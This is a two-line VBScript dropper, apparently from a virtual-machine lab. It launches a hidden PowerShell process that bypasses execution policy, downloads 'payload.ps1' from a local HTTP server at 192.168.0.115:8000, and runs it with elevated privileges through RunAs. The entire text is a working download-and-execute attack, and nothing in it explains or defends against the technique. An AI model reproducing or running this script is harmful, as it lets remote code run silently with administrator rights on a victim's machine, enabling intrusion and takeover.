Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command curl -o C:\Users\vboxuser\Downloads\payload.ps1 http://192.168.0.115:8000/test.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass', '-File', 'C:\Users\vboxuser\Downloads\payload.ps1' -Verb RunAs", 0, False
